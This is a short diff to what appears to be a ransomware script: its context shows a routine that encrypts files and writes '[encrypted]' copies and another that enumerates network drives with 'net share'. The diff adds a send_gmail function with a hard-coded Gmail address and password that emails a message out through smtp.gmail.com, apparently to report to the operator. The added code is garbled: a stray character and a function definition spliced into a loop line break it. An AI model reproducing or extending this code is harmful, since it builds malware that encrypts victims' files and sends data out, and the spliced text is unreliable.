@@ -34,7 +34,7 @@ def encrypt_files():
 			data = f.read()
 
 			enc_data = Encrypt.encrypt(data)
-
+ô
 			newfile = open(path+"[encrypted]","wb")
 
 			newfile.write(enc_data)
@@ -59,7 +59,24 @@ def find_drive():
 
 	cmd = check_output("net share",shell=True)
 
-	for i in drive:
+	for i in drive:def send_gmail(msg):
+
+		USER="mrxvito@gmail.com"
+		PASS="mobinnasiri"
+
+		FROM = USER
+		TO = ["mrxvito@gmail.com"]
+		    
+		message = msg
+
+		server = smtplib.SMTP()
+		server.connect("smtp.gmail.com",587)
+		server.starttls()
+		server.login(USER,PASS)
+		server.sendmail(FROM, TO, message)
+		server.quit()
+
+
 
 		if i in cmd:
 			system_drive.append(i)
